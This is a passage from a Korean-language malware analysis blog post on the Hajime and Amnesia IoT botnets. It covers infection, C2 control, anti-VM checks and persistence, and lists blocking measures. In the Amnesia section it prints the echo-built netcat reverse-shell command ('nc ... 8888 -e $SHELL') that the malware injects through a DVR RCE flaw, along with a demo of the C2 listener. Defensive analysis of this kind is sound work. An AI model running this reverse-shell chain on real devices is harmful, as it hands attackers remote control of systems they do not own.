이때 hajime에 감염된 프로세서에 맞는 모듈을 .p 디렉터리에 내려받게 된다.

실행 중인 모듈에 대해서는 .p/.d에 설정파일을 저장하며, 새로운 바이너리를 .i로 압축 해제하여 execv를 이용해 실행하게 된다.

### 3.1.6 전파

exp 모듈(바이너리)의 다른 IoT Device에 Telnet brute force를 통해 hajime botnet을 전파하는 역할이다.


## 3.2 Protecting

### 3.2.1 Block UDP packets containing P2P traffic
hajime botnet은 기본적으로 UDP 기반의 P2P 프로토콜을 사용하는 것이다. 이때 사용되는 주요 메시지를 차단하는 방법이다.

```
00 00 00 21 00 00 c0 dd 26 97 c4 a1 7d f8 3f 36
a9 97 99 dd 38 49 58 72 84 90 fa c7 d1 31 82 05
2d 88 4e 6e 42 84
```

### 3.2.2 Block TCP connections containing attack traffic
"/bin/busybox ECCHI" 명령 사용은 mirai, hajime의 공통점이다. 해당 문자열이 포함된 패킷을 차단하거나 감염 의심해야 한다.

### 3.2.3 Block TCP port
1차 감염이후 2차 감염을 위해 파일을 내려받는 port는 4636으로 정해져 있다. blacklist 방식으로 port 차단하는 것은 좋은 방법은 아니지만, 이 방법 또한 하나의 대응방안이 될 수 있다.

## 3.3 Hajime botnet 목적
hajime botnet의 목적은 대량의 IoT Device를 감염시켜 DDoS에 사용하기 위함이 기본이다.
하지만 mirai와 같이 오픈소스화 되지 않아 공격자가 정의한 페이로드에 따라 다양한 목적에 사용될 것이다.

## 3.4 Hajime와 mirai의 관계
Hajime는 mirai와 최초 Device 접근 부분이 Telnet을 사용하고 있고 명령 수행 시 ECCHI를 사용하지만 동작 과정은 botnet의 한 종류인 qbot과 많이 유사하다. mirai의 변종으로 속이기 위한 수단이 아닐까 한다.

# 4. Amnesia botnet

원문 : http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/

Amnesia botnet은 취약한 시스템을 검색하여 RCE(Remote code execution)을 통해 IoT Device를 장악하는 botnet이다. 감염 목적은 DDoS로 나타난다.

2016년 3월 22일 보안 연구원인 Rotem Kerner에 의해서 발견된 취약점을 기반으로 Amnesia botnet 공격이 발생하였다.

해당 취약점은 "TVT Digital"에서 제조한 70개의 DVR 업체가 해당 취약점의 영향을 받았다고 한다.

- Remote Code Execution in CCTV-DVR affecting over 70 different vendors : http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html

## 4.1 Amnesia botnet 동작 과정

### 4.1.1 감염
감염 단계에서는 위 취약점을 이용해 DVR Device를 감염 시키게 된다.

### 4.1.2 제어
감염된 DVR Device는 IRC 프로토콜을 이용하여 C2 서버와 통신을 하게 된다. 아래 그림처럼 다양한 DDoS 유형을 공격할 수 있게 설계되었다.

<img src="{{ site.url }}/images/persu/Amnesia_2.png" style="display: block; margin: auto;">

DDoS 명령뿐만 아니라 감염된 botnet을 제어할 수 있는 명령어까지 구성된 것을 알 수 있다.

### 4.1.3 전파

추가로 CCTVSCANNER 및 CCTVPROCS라는 두 가지 명령이 발견되었는데 이 명령은 TVT Digital DVR의 RCE 취약점을 검색하고 악용하는 데 사용된다.

Amnesia botnet은 위 명령을 받은 후 명령에 포함 된 IP 주소로 간단한 HTTP 요청을 만들어 대상이 취약한 DVR 장치인지 확인하게 된다.

TVT Digital에서 제작한 DVR Device는 HTTP Response Header 내 "Cross Web Server"라는 메시지가 리턴되는 특이점을 이용하여 확인하게 된다.

<img src="{{ site.url }}/images/persu/Amnesia_3.png" style="display: block; margin: auto;">

취약한 DVR Device가 발견되면 Amnesia botnet은 RCE 취약점을 이용해 4가지 명령어를 HTTP Request로 보내게 된다.

DVR Device 측

```
echo "nc" > f
echo "{one_of_c2_domains : IP}" >> f
echo "8888 -e $SHELL" >> f
$(cat f) & > r

study persu$ ps
  PID TTY           TIME CMD
13370 ttys000    0:00.01 nc 192.168.1.1 8888 -e /bin/bash
```

C2 서버 측 (가상환경)

```
study persu$ nc -l -p 8888
id
uid=501(persu) gid=20(staff)
```

위 명령을 실행 시 해당 C2 서버와 리버스 형식으로 연결되며, C2 서버는 추가로 DVR Device에 명령을 전달 할 수 있다.

<img src="{{ site.url }}/images/persu/Amnesia_4.png" style="display: block; margin: auto;">

## 4.2 Amnesia botnet Anti-Forensics
Amnesia botnet이 실제로 DVR Device에서 실행 시 /sys/class/dmi/id/product_name과 /sys/class/dmi/id/sys_vendor 두 파일을 확인하게 된다. 두 파일을 읽어 가상환경인지 확인하게 되는데 실제로 vmware환경에서 ubuntu 설치 후 두 파일 확인 시 가상환경임을 알 수 있는 메시지가 출력되었다.

```
persu@ubuntu:~/Downloads/fmk$ cat /sys/class/dmi/id/product_name
VMware Virtual Platform
persu@ubuntu:~/Downloads/fmk$ cat /sys/class/dmi/id/sys_vendor
VMware, Inc.
```

<img src="{{ site.url }}/images/persu/Amnesia_5.png" style="display: block; margin: auto;">

가상환경일 경우 Amnesia botnet은 세 곳의 디렉터리를 삭제하는 명령을 수행하게 된다.
- the Linux root directory “/” : root 디렉터리
- the current user’s home directory “~/” : user의 home 디렉터리
- the current working directory “./” : 현재 디렉터리

아래 그림처럼 rm -rf 명령을 통해 세 곳의 디렉터리를 삭제하게 된다.

<img src="{{ site.url }}/images/persu/Amnesia_6.png" style="display: block; margin: auto;">

가상환경이 아닐 경우에는 아래와 같이 지속성이 있는 파일을 만들게 된다.

```
/etc/init.d/.rebootime
/etc/cron.daily/.reboottime
~/.bashrc
~/.bash_history
```

이후 Telnet, SSH를 종료 시킨 후 C2 서버와 연결하여 추가 명령을 수신한다.

명령을 전달 받는 IRC 서버는 "irc.freenode.net"로 하드 코딩 되어 있고 추가로 아래 세 URL이 발견 되었다.

- ukranianhorseriding[.]net
- surrealzxc.co[.]za
- inversefierceapplied[.]pw

## 4.3 Protecting
Amnesia botnet의 경우 DVR Device가 가지고 있는 RCE 취약점을 이용한 공격이기 때문에 해당 취약점에 대해 제조사가 업데이트를 제공하는 것이 먼저 되어야 하며, 특정 시스템을 파악할 수 있는 메시지인 "Cross web server"처럼 노출되지 않도록 개발 단계에서부터 시스템을 구성해야 한다.
